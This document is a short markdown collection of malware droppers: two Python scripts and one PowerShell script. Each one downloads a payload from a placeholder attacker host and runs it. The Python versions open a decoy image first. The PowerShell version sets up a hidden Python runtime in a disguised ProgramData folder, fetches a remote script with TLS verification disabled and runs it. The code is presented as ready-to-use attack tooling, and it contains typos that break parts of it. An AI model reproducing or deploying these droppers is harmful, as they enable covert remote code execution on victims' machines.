# Downloader

## Python

```python
import requests
import subprocess
import os
import tempfile

def change_tempory_directory() -> None:
	temp_directory = tempfile.gettempdir()
	os.chdir(temp_directory)

def download_file(url) -> None:
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as out_file:
        out_file.write(get_response.content)

def open_decoy(filename) -> None:
	subprocess.Popen(filename, shell=True)

def execute_dropper(payload) -> None:
	subprocess.call(payload, shell=True)

if __name__ == '__main__':
	change_tempory_directory()

	attacker_url = "http://<attacker_IP>/payload.exe"
	decoy_url = "https://<decoy_IP>/image.png"

	download_file(decoy_url)
	open_decoy('image.png')
	
	download_file(attacker_url)
	execute_dropper('payload.exe')
```

Second variant.

```python
import requests, os
from io import BytesIO
from subprocess import Popen

def download_execute(url, filename) -> None:
    response = resquests.get(url)

    if response.status_code == 200:
        payload = BytesIO(response.content)
        raw_data = payload.read()
        current_directory = os.getcwd()

        with open(os.path.join(current_directory, filename), 'wb') as file:
            file.write(raw_data)
        run = Popen(filename)
    else:
        print('Errors in request and response')

if __name__ == '__main__':
	attacker_url = 'http[s]://<attacker_IP>/payload.exe'
	decoy_url = "https://<decoy_IP>/image.png"

	download_execute(decoy_url, 'image.png')
	download_execute(attacker_url, 'payload.exe')
```

## PowerShell

```powershell
$extractTo = "C:\ProgramData\NewPythonDirectoryName" # Give it a long random alphanumeric string 46 in total
$pythonExe = Join-Path $extractTo "pythonw.exe"

$pythonInstalled = ((Test-Path $pythonExe) -and (Get-Process -Name "pythonw" -ErrorAction SilentlyContinue))

if (-not $pythonInstalled) {
    try {
        $pythonUrl = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-embeded.zip"
        $pythonZip = "C:\ProgramData\python-3.12.3-embeded-amd64.zip"

        $xml_http_request = New-Object -ComObject MSXML2.XMLHTTP
        $xml_http_request.open('GET', $pythonUrl, $false)
        $xml_http_request.send()
    } catch {
        Write-Error $_.Exception.Message
        exit 1
    }
}

try {
    $process = New-Object System.Diagnostics.ProcessStartInfo
    $process.FileName = $pythonExe
    $process.Arguments = "-c `"import urllib.request,ssl; url = 'http[s]://<attacker_IP>/payload.py'; context = ssl._create_unverified_context(); exec(urllib.request.urlopen(url, context=context).read().decode('utf-8'))`""
    $process.UseShellExecute = $false
    $process.CreateNoWindow = $true
    $proces.WindowStyle = 'Hidden'

    $process = [System.Diagnostics.Process]::Start($process)
    $null = $process.Handle
} catch {
        Write-Error $_.Exception.Message
        exit 1
    }
```